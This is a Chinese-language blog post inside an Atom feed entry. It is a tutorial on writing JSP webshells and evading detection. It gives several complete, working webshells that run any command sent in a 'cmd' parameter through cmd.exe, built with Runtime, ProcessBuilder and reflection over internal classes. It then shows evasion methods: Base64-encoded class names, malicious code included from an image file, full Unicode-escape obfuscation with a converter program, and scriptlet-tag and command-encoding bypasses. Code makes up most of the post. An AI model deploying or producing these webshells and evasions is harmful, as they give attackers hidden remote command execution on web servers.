    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>Java命令执行的类，主要是<code>Runtime</code>类和<code>ProcessBuilder</code>类，根据这两个类，我们可以编写出经典的jsp webshell，代码以适用windows平台为例</p><span id="more"></span><h3 id="Runtime类实现命令执行"><a href="#Runtime类实现命令执行" class="headerlink" title="Runtime类实现命令执行"></a>Runtime类实现命令执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html;charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    out.print(System.getProperty(&quot;os.name&quot;).toLowerCase());</span><br><span class="line">    String  cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    if(cmd != null)&#123;</span><br><span class="line">        Process p =  Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c&quot;,cmd&#125;);</span><br><span class="line">        InputStream input = p.getInputStream();</span><br><span class="line">        InputStreamReader ins = new InputStreamReader(input, &quot;GBK&quot;);</span><br><span class="line">        BufferedReader br = new BufferedReader(ins);</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        String line;</span><br><span class="line">        while((line = br.readLine()) != null) &#123;</span><br><span class="line">            out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">        br.close();</span><br><span class="line">        ins.close();</span><br><span class="line">        input.close();</span><br><span class="line">        p.getOutputStream().close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="ProcessBuilder类实现命令执行"><a href="#ProcessBuilder类实现命令执行" class="headerlink" title="ProcessBuilder类实现命令执行"></a>ProcessBuilder类实现命令执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html;charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">        out.print(System.getProperty(&quot;os.name&quot;).toLowerCase());</span><br><span class="line">        String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">        if(cmd != null)&#123;</span><br><span class="line">            String[] cmds = new String[]&#123;&quot;cmd&quot;,&quot;/c&quot;,cmd&#125;;</span><br><span class="line">            ProcessBuilder builder = new ProcessBuilder(cmds);</span><br><span class="line">            Process process = builder.start();</span><br><span class="line">            InputStream in = process.getInputStream();</span><br><span class="line">            InputStreamReader ins = new InputStreamReader(in, &quot;GBK&quot;);</span><br><span class="line">            BufferedReader br = new BufferedReader(ins);</span><br><span class="line">            out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">            String line;</span><br><span class="line">            while((line = br.readLine()) != null) &#123;</span><br><span class="line">                out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">            br.close();</span><br><span class="line">            ins.close();</span><br><span class="line">            in.close();</span><br><span class="line">            process.getOutputStream().close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>利用反射来免杀webshell是常用技术之一</p><h3 id="反射获取Runtime类实现命令执行"><a href="#反射获取Runtime类实现命令执行" class="headerlink" title="反射获取Runtime类实现命令执行"></a>反射获取Runtime类实现命令执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html;charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.InvocationTargetException&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    out.print(System.getProperty(&quot;os.name&quot;).toLowerCase());</span><br><span class="line">    String  cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    if(cmd != null) &#123;</span><br><span class="line">        String[] cmds = new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;, cmd&#125;;</span><br><span class="line">        Class clazz = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor declaredConstructor = clazz.getDeclaredConstructor();</span><br><span class="line">        declaredConstructor.setAccessible(true);</span><br><span class="line">        Object o = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            o = declaredConstructor.newInstance();</span><br><span class="line">        &#125; catch (InstantiationException | IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Method show = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            show = clazz.getDeclaredMethod(&quot;exec&quot;, String[].class);</span><br><span class="line">        &#125; catch (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Object invoke = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            invoke = show.invoke(o, (Object) cmds);</span><br><span class="line">        &#125; catch (IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Process invoke1 = (Process) invoke;</span><br><span class="line"></span><br><span class="line">        InputStream input = invoke1.getInputStream();</span><br><span class="line">        InputStreamReader ins = new InputStreamReader(input, &quot;GBK&quot;);</span><br><span class="line">        BufferedReader br = new BufferedReader(ins);</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        String line;</span><br><span class="line">        while ((line = br.readLine()) != null) &#123;</span><br><span class="line">            out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">        br.close();</span><br><span class="line">        ins.close();</span><br><span class="line">        input.close();</span><br><span class="line">        invoke1.getOutputStream().close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="反射获取ProcessBuilder类实现命令执行"><a href="#反射获取ProcessBuilder类实现命令执行" class="headerlink" title="反射获取ProcessBuilder类实现命令执行"></a>反射获取ProcessBuilder类实现命令执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html;charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.InvocationTargetException&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    out.print(System.getProperty(&quot;os.name&quot;).toLowerCase());</span><br><span class="line">    String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    if(cmd != null)&#123;</span><br><span class="line">        String[] cmds = new String[]&#123;&quot;cmd&quot;,&quot;/c&quot;,cmd&#125;;</span><br><span class="line">        Class clazz = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor declaredConstructors = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            declaredConstructors = clazz.getDeclaredConstructor(String[].class);</span><br><span class="line">        &#125; catch (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Object o = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            o = declaredConstructors.newInstance((Object) cmds);</span><br><span class="line">        &#125; catch (InstantiationException | IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Method command = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            command = clazz.getDeclaredMethod(&quot;start&quot;);</span><br><span class="line">        &#125; catch (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Object invoke = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            invoke = command.invoke(o);</span><br><span class="line">        &#125; catch (IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Process invoke1 = (Process) invoke;</span><br><span class="line">        InputStream input = invoke1.getInputStream();</span><br><span class="line">        InputStreamReader ins = new InputStreamReader(input, &quot;GBK&quot;);</span><br><span class="line">        BufferedReader br = new BufferedReader(ins);</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        String line;</span><br><span class="line">        while ((line = br.readLine()) != null) &#123;</span><br><span class="line">            out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">        br.close();</span><br><span class="line">        ins.close();</span><br><span class="line">        input.close();</span><br><span class="line">        invoke1.getOutputStream().close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="反射获取ProcessImpl类实现命令执行"><a href="#反射获取ProcessImpl类实现命令执行" class="headerlink" title="反射获取ProcessImpl类实现命令执行"></a>反射获取ProcessImpl类实现命令执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html;charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Map&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.InvocationTargetException&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    out.print(System.getProperty(&quot;os.name&quot;).toLowerCase());</span><br><span class="line">    String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    if(cmd != null) &#123;</span><br><span class="line">        String[] cmds = new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;;</span><br><span class="line">        Class clazz = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        //获取该class类</span><br><span class="line">        Method method = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);</span><br><span class="line">        method.setAccessible(true);</span><br><span class="line">        //忽略访问权限</span><br><span class="line">        Process invoke1 = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            invoke1 = (Process) method.invoke(null, cmds, null, &quot;.&quot;, null, true);</span><br><span class="line">        &#125; catch (IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        InputStream input = invoke1.getInputStream();</span><br><span class="line">        InputStreamReader ins = new InputStreamReader(input, &quot;GBK&quot;);</span><br><span class="line">        BufferedReader br = new BufferedReader(ins);</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        String line;</span><br><span class="line">        while ((line = br.readLine()) != null) &#123;</span><br><span class="line">            out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">        br.close();</span><br><span class="line">        ins.close();</span><br><span class="line">        input.close();</span><br><span class="line">        invoke1.getOutputStream().close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>有些检测工具可能会对命令执行的类名进行检测，这里可以对类名进行加密或者编码，比如对<code>java.lang.Runtime</code>进行base64编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String a = new String(Base64.getDecoder().decode(&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;));</span><br><span class="line">System.out.println(a);</span><br></pre></td></tr></table></figure><p>不仅仅是类名，像命令执行的函数名同理，方法有很多，常见的加密都可以尝试。</p><h2 id="include指令"><a href="#include指令" class="headerlink" title="include指令"></a>include指令</h2><p>Java Web 中有<code>include</code>指令，可以将外部文件嵌入到当前jsp语句中，并同时解析页面的jsp语句，和PHP中的<code>include</code>类似。</p><p>比如我们包含一个1.jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ include file=&quot;1.jpg&quot; %&gt;</span><br></pre></td></tr></table></figure><p>这个时候我们可以在1.jpg中插入恶意代码，也是可以正常访问的</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220319103521521-734876725.png" alt="image-20220319103520678"></p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>Java 程序可以自动识别Unicode编码，所以我们可以将java源代码中除了page指令的代码外的，全部编码。</p><p>编写代码如下，代码的功能是读取保存了恶意代码的文件，然后将文件中的代码进行unicode编码输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">package com.sec.test01.test;</span><br><span class="line"></span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Testdd &#123;</span><br><span class="line">    public static void  convert(String str) &#123;</span><br><span class="line">        str = (str == null ? &quot;&quot; : str);</span><br><span class="line">        String tmp;</span><br><span class="line">        StringBuffer sb = new StringBuffer(1000);</span><br><span class="line">        char c;</span><br><span class="line">        int i, j;</span><br><span class="line">        sb.setLength(0);</span><br><span class="line">        for (i = 0; i &lt; str.length(); i++) &#123;</span><br><span class="line">            c = str.charAt(i);</span><br><span class="line">            sb.append(&quot;\\u&quot;);</span><br><span class="line">            j = (c &gt;&gt;&gt; 8); //取出高8位</span><br><span class="line">            tmp = Integer.toHexString(j);</span><br><span class="line">            if (tmp.length() == 1) &#123;</span><br><span class="line">                sb.append(&quot;0&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(tmp);</span><br><span class="line">            j = (c &amp; 0xFF); //取出低8位</span><br><span class="line">            tmp = Integer.toHexString(j);</span><br><span class="line">            if (tmp.length() == 1) &#123;</span><br><span class="line">                sb.append(&quot;0&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(tmp);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(new String(sb));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        File srcfile = new File(&quot;D:\\code\\java1\\Reflect\\src\\main\\java\\com\\sec\\test01\\test\\1.txt&quot;);</span><br><span class="line">        FileReader fileReader = new FileReader(srcfile);</span><br><span class="line">        BufferedReader bufferedReader = new BufferedReader(fileReader);</span><br><span class="line">        String s;</span><br><span class="line">        while ((s = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">            convert(s);</span><br><span class="line">            System.out.print(&quot;\r\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编写一个jsp，import需要的类，剩余就把生成的unicode字符粘贴到里面即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html;charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.InvocationTargetException&quot; %&gt;</span><br><span class="line">&lt;!--import导入需要的类，否则会导致创建变量失败--&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    生成的unicode编码</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220319110731267-51009504.png" alt="image-20220319110731080"></p><p>可以进一步优化，Unicode编码的关键点在于以’\u’开头，表明是unicode编码，可以将’u’重复声明，即’\uuuuuuu’达到混淆的目的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(&quot;\u006f\u0075\u0074&quot;);</span><br><span class="line">System.out.println(&quot;\uuuuuu006f\uuuuuuu0075\uuu0074&quot;);</span><br></pre></td></tr></table></figure><p>输出一致：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220319111304030-1585241469.png" alt="image-20220319111303826"></p><p>可以再输出的时候将”\u”替换成”\uuuuuuuu”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.print(new String(sb).replace(&quot;\\u&quot;, &quot;\\uuuuuuuu&quot;));</span><br></pre></td></tr></table></figure><p>同样，也可以转换成其他编码格式。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>标签绕过，jsp标签<code>&lt;%%&gt;</code>可以使用<code>&lt;jsp:scriptlet&gt;&lt;/jsp:scriptlet&gt;</code>代替。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">    恶意代码</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br></pre></td></tr></table></figure><p>效果一样</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220319112955214-1339046604.png" alt="image-20220319112955161"></p><p>对于传入的参数可以先将其存储进会话，然后调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request.setAttribute(&quot;a&quot;,request.getParameter(&quot;cmd&quot;));</span><br><span class="line">String cmd = request.getAttribute(&quot;a&quot;).toString();</span><br></pre></td></tr></table></figure><p>检测传入的命令，可以通过编码、加密、反转等等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//base64编码反转</span><br><span class="line">String cmd = new String(Base64.getDecoder().decode(reverseStr(bs64)),&quot;UTF-8&quot;);</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/c54ec1cbc091">https://www.jianshu.com/p/c54ec1cbc091</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;命令执行&quot;&gt;&lt;a href=&quot;#命令执行&quot; class=&quot;headerlink&quot; title=&quot;命令执行&quot;&gt;&lt;/a&gt;命令执行&lt;/h2&gt;&lt;p&gt;Java命令执行的类，主要是&lt;code&gt;Runtime&lt;/code&gt;类和&lt;code&gt;ProcessBuilder&lt;/code&gt;类，根据这两个类，我们可以编写出经典的jsp webshell，代码以适用windows平台为例&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反射" scheme="https://kpa1on.github.io/tags/%E5%8F%8D%E5%B0%84/"/>
    
    <category term="Webshell" scheme="https://kpa1on.github.io/tags/Webshell/"/>
    
    <category term="免杀" scheme="https://kpa1on.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
</feed>
